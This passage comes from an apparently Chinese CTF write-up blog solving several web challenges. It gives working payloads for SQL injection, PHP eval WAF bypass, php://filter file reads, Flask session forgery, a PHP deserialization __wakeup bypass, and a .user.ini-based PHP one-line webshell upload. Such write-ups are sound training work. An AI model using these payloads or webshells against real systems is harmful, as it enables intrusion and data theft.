class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span>   </span><br><span class="line">=&gt;<span class="string">"select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag"</span>;</span><br></pre></td></tr></table></figure><p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能。</p><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>有三个文件<br>flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flag.txt</span><br><span class="line">flag in &#x2F;fllllllllllllag</span><br></pre></td></tr></table></figure><p>welcome.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;welcome.txt</span><br><span class="line">render</span><br></pre></td></tr></table></figure><p>hints.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><p>提示flag就在/fllllllllllllag 访问跳到 /error?msg=Error ,猜测有模板注入<br>尝试输入/error?msg=1，确实存在模板注入。<br>Python tornado框架存在附属文件 handler.settings,于是尝试输入/error?msg=<br>返回   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'autoreload'</span>: True, <span class="string">'compiled_template_cache'</span>: False, <span class="string">'cookie_secret'</span>: <span class="string">'6cf024f5-e2ff-4c16-8989-5b16c648ca74'</span>&#125;</span><br></pre></td></tr></table></figure><p>根据hints.txt的提示，依据观察三个文件的url地址可知，需要按照如下访问，才可以得到文件的内容。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?filename&#x3D;&#x2F;文件名&amp;filehash&#x3D;md5(cookie_secret+md5(文件名))</span><br></pre></td></tr></table></figure><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5hash(data):</span><br><span class="line">    md5&#x3D;hashlib.md5()</span><br><span class="line">    md5.update(data)</span><br><span class="line">    print(md5.hexdigest())</span><br><span class="line">    return  md5.hexdigest()</span><br><span class="line"></span><br><span class="line">def filehash(filename):</span><br><span class="line">    cookie_secret &#x3D; &quot;6cf024f5-e2ff-4c16-8989-5b16c648ca74&quot;</span><br><span class="line">    result&#x3D;md5hash((cookie_secret + md5hash(filename.encode(&#39;utf-8&#39;))).encode(&#39;utf-8&#39;))</span><br><span class="line">    return  result</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    filename &#x3D; &quot;&#x2F;fllllllllllllag&quot;</span><br><span class="line">    result&#x3D;&quot;&#x2F;file?filename&#x3D;&#123;&#125;&amp;filehash&#x3D;&#123;&#125;&quot;</span><br><span class="line">    print(result.format(filename,filehash(filename)))</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;232236da1a1b017078826b86cced846a</span><br></pre></td></tr></table></figure><p>可得到flag</p><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>存在sql注入，万能密码登录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=orandin<span class="string">'  or '</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>查看html源码，可知有calc.php文件，访问可得waf的过滤方式  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>tips:<br>PHP的字符串解析特性:<br> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线（包括空格）  </p><p> num参数的值如果为字母就会显示页面请求就会错误。可以猜测这里的waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。（主要是waf不是用php写的）   </p><p> answer:<br> 首先我们要先扫根目录下的所有文件，也就是是scandir(“/“),但是/被过滤了，所以我们用chr(47)绕过,发现flagg文件<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%<span class="number">20</span>num=<span class="number">1</span>;var_dump(scandir(chr(<span class="number">47</span>)))</span><br></pre></td></tr></table></figure><br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%<span class="number">20</span>num=var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure></p><h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">        &lt;!--</span><br><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line"><span class="keyword">echo</span> $cat;</span><br><span class="line"><span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>answer:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cat&#x3D;dog</span><br></pre></td></tr></table></figure><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>随便注册一个账号登录，在修改密码的地方，提示源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581" target="_blank" rel="noopener">HCTF2018-admin</a></p><p>解法一：session伪造<br>注册一个账号后登入，抓包得到cookie的session,解密得 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'_fresh'</span>: <span class="literal">True</span>, <span class="string">'_id'</span>: <span class="string">b'fe143907fe0a678ebe8ceb972968e2f7b98bb5586f8db03defbde94a673235364017f31733e74b7fa98a1d2a163f0c7d7b776b3a68dc1ef96a392cd5c205af28'</span>, <span class="string">'csrf_token'</span>: <span class="string">b'6298f03ac923b6b7006403d7a5ca798a645e338e'</span>, <span class="string">'image'</span>: <span class="string">b'V7hq'</span>, <span class="string">'name'</span>: <span class="string">'test'</span>, <span class="string">'user_id'</span>: <span class="string">'10'</span>&#125;</span><br></pre></td></tr></table></figure><p>如果我们想要加密伪造生成自己想要的session还需要知道SECRET_KEY，在config.py里可以发现了SECRET_KEY。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = os.environ.get(<span class="string">'SECRET_KEY'</span>) <span class="keyword">or</span> <span class="string">'ckj123'</span></span><br></pre></td></tr></table></figure><p>一个flask session加密的脚本 <a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a>             </p><p>利用刚刚得到的SECRET_KEY，在将解密出来的name改为admin，最后用脚本生成我们想要的session即可<br>加密     </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;fe143907fe0a678ebe8ceb972968e2f7b98bb5586f8db03defbde94a673235364017f31733e74b7fa98a1d2a163f0c7d7b776b3a68dc1ef96a392cd5c205af28&#39;, &#39;csrf_token&#39;: b&#39;6298f03ac923b6b7006403d7a5ca798a645e338e&#39;, &#39;image&#39;: b&#39;V7hq&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;&quot;</span><br></pre></td></tr></table></figure><p>解法二： unicode </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>假如我们注册ᴬᴰᴹᴵᴺ用户，然后在用ᴬᴰᴹᴵᴺ用户登录，因为在login函数里使用了一次nodeprep.prepare函数，因此我们登录上去看到的用户名为ADMIN，此时我们再修改密码，又调用了一次nodeprep.prepare函数将name转换为admin，然后我们就可以改掉admin的密码，最后利用admin账号登录即可拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>用bp截取数据吧，在302跳转的页面得知secr3t.php </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">   secr3t.php        </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问secr3t.php得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用php://filter的php伪协议读取   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>联合注入  #在get请求中记得url编码，要不会被当成锚点   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;666f93b7-713c-4980-819e-74815fd17c90.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;dfg&#39; union select 1,(select group_concat(username,0x23,password) from l0ve1ysq1),3 %23</span><br></pre></td></tr></table></figure><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>源码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"ie=edge"</span>&gt;</span><br><span class="line">    &lt;title&gt;Upload Labs&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Upload Labs&lt;/h2&gt;</span><br><span class="line">    &lt;form action=<span class="string">"index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">"file"</span> name=<span class="string">"fileUpload"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> name=<span class="string">"upload"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line">$userdir = <span class="string">"uploads/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . <span class="string">"/index.php"</span>, <span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">if</span> (!$tmp_name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"filesize too big!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"filename cannot be empty!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/ph|htacess/i"</span>, $extension)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"illegal suffix!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"exif_imagetype:not image!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . <span class="string">"/"</span> . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Your dir "</span> . $userdir. <span class="string">' &lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your files : &lt;br&gt;'</span>;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tips:  </p><p>1.exif_imagetype 文件类型判断<br>可以通过给上传脚本加上相应的幻数头字节就可以绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JPG ：FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">GIF(相当于文本的GIF89a)：47 49 46 38 39 61</span><br><span class="line">PNG： 89 50 4E 47</span><br></pre></td></tr></table></figure><p>2.user.ini<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini详解介绍</a>   </p><p>answer:<br>首先，构造一个.user.ini文件，内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a             </span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure><p>然后构造一个a.jpg，内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">'php'</span>&gt; @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后将两个文件分别上传到服务器上，拿到回显1</p><p>菜刀连接本就存在的index.php文件 ，该index.php会包含a.jpg里面的一句话</p><h1 id="极客大挑战-2019-PHP1"><a href="#极客大挑战-2019-PHP1" class="headerlink" title="[极客大挑战 2019]PHP1"></a>[极客大挑战 2019]PHP1</h1><p>有<a href="http://www.zip备份文件" target="_blank" rel="noopener">www.zip备份文件</a><br>index.php </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">$select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">$res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>tips:<br><code>__wakeup()</code> 当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</p><p>关于类属性的访问权限：   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public   不用修饰 </span><br><span class="line">private   需要加%00类名%00</span><br><span class="line">protected  则需要使用%00*%00</span><br></pre></td></tr></table></figure><p>answer:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$username</span> =<span class="string">'admin'</span> ;</span><br><span class="line">    private <span class="variable">$password</span> =100 ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(serialize(new Name()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将成员数目2修改为其他数目，private的不可打印字符用%00代替</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">"Name"</span>:3:&#123;s:14:<span class="string">"%00Name%00username"</span>;s:5:<span class="string">"admin"</span>;s:14:<span class="string">"%00Name%00password"</span>;i:100;&#125;</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p>直接菜刀连接<br>flag在根目录   </p><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>在html源码中找到Secret.php文件，访问后提示要从<a href="https://www.Sycsecret.com访问，bp抓包添加header头部" target="_blank" rel="noopener">https://www.Sycsecret.com访问，bp抓包添加header头部</a> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br></pre></td></tr></table></figure><p>又提示Please use “Syclover” browser ,修改User-Agent</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Syclover</span><br></pre></td></tr></table></figure><p>又提示No!!! you can only read this locally!!! ,添加X-Forwarded-For</p><figure class="highlight bash"><table><tr><td 